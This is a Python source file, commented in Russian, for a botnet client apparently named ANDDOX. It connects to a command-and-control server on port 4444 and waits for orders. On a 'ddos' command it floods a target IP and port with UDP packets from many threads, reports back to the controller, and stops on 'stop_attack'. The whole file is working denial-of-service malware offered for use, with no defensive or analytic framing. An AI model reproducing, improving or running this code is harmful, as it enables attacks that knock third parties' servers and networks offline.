import socket
import threading
import random
import time

class BotClient:
    def __init__(self, server_host, server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.sock = None
        self.running = True
        self.attack_threads = []  # список потоков атаки
        self.attack_active = False  # флаг для остановки атаки

    def connect(self):
        """Подключение к серверу"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server_host, self.server_port))
            return True
        except Exception as e:
            print(f"Ошибка подключения: {e}")
            return False

    def udp_flood(self, target_ip, target_port, num_threads):
        """Запуск UDP флуда в num_threads потоках"""
        self.attack_active = True
        bytes_data = random._urandom(1024)  # 1KB пакеты

        def flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.attack_active:
                try:
                    sock.sendto(bytes_data, (target_ip, target_port))
                except:
                    time.sleep(0.01)
            sock.close()

        for _ in range(num_threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            self.attack_threads.append(t)
        
        # Уведомляем сервер о запуске
        try:
            self.sock.send(f"[+] DDoS на {target_ip}:{target_port} запущен ({num_threads} потоков)".encode())
        except:
            pass

    def stop_attack(self):
        """Остановка всех атак"""
        self.attack_active = False
        # Потоки завершатся сами (daemon), но можно подождать
        self.attack_threads.clear()
        try:
            self.sock.send("[-] Атака остановлена".encode())
        except:
            pass

    def run(self):
        """Основной цикл приёма команд"""
        if not self.connect():
            return
        
        # Поток для проверки соединения (необязательно)
        while self.running:
            try:
                command = self.sock.recv(4096).decode()
                if not command:
                    break
                parts = command.split()
                if parts[0].lower() == 'ddos' and len(parts) >= 3:
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    num_threads = int(parts[3]) if len(parts) >= 4 else 10
                    # Если уже идёт атака, сначала остановим
                    if self.attack_active:
                        self.stop_attack()
                    threading.Thread(target=self.udp_flood, args=(target_ip, target_port, num_threads), daemon=True).start()
                elif command.lower() == 'stop_attack':
                    self.stop_attack()
                else:
                    self.sock.send(f"Неизвестная команда: {command}".encode())
            except Exception as e:
                # Соединение разорвано
                break
        self.sock.close()
        self.running = False

if __name__ == "__main__":
    server_host = input("Введите IP сервера ANDDOX: ")
    client = BotClient(server_host)
    client.run()